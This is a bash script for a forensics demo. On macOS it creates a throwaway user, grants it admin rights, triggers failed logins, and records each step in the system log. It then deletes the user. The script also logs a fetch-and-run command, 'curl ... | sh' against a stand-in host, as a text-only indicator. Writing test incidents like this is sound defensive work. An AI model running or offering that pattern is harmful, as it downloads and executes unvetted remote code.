#!/usr/bin/env bash
# Safe test incident - macOS.
#
# Performs real, reversible account actions and records each one in the
# Unified Log (via `logger`, tag forensics-demo) so the macOS collector can
# label it - macOS does not log these actions with stable, parseable text:
#   sysadminctl -addUser              -> User Account Created
#   dseditgroup add to 'admin'        -> User Added to Admin Group
#   dscl -authonly wrong password x5  -> Authentication Failure
#   logger text                       -> Suspicious shell command pattern
#   sysadminctl -deleteUser           -> cleanup
#
# The account gets a random password that is never printed or stored.
# Nothing is downloaded or executed. Requires root (run the backend with sudo).
# Each "STEP:" line is shown to the investigator in the dashboard.
set -uo pipefail
USER_NAME=forensics_demo
TAG=forensics-demo

if id "$USER_NAME" &>/dev/null; then
  echo "ERROR: user $USER_NAME already exists; refusing to touch it."
  exit 2
fi

cleanup() {
  dseditgroup -o edit -d "$USER_NAME" -t user admin &>/dev/null
  sysadminctl -deleteUser "$USER_NAME" &>/dev/null
  if id "$USER_NAME" &>/dev/null; then
    echo "WARNING: could not delete $USER_NAME; remove it with: sudo sysadminctl -deleteUser $USER_NAME"
  else
    logger -t "$TAG" "removed '$USER_NAME' from group 'admin' and deleted user account $USER_NAME"
    echo "STEP: Cleanup - removed $USER_NAME from 'admin' and deleted it"
  fi
}
trap cleanup EXIT

if sysadminctl -addUser "$USER_NAME" -password "Fd!$(uuidgen)" &>/dev/null; then
  logger -t "$TAG" "new user: name=$USER_NAME created with sysadminctl -addUser"
  echo "STEP: Created temporary user $USER_NAME (sysadminctl)"
fi

if dseditgroup -o edit -a "$USER_NAME" -t user admin &>/dev/null; then
  logger -t "$TAG" "add '$USER_NAME' to group 'admin' (dseditgroup)"
  echo "STEP: Added $USER_NAME to 'admin'"
fi

for i in 1 2 3 4 5; do
  if ! dscl . -authonly "$USER_NAME" "WrongPassword$i" &>/dev/null; then
    logger -t "$TAG" "authentication failure for user $USER_NAME (dscl -authonly, wrong password $i)"
  fi
done
echo "STEP: 5 failed authentications for $USER_NAME with wrong passwords"

logger -t "$TAG" "safe test indicator (text only, not executed): curl -s http://example.invalid/x.sh | sh"
echo "STEP: Logged a download-and-execute pattern as text only (nothing ran)"
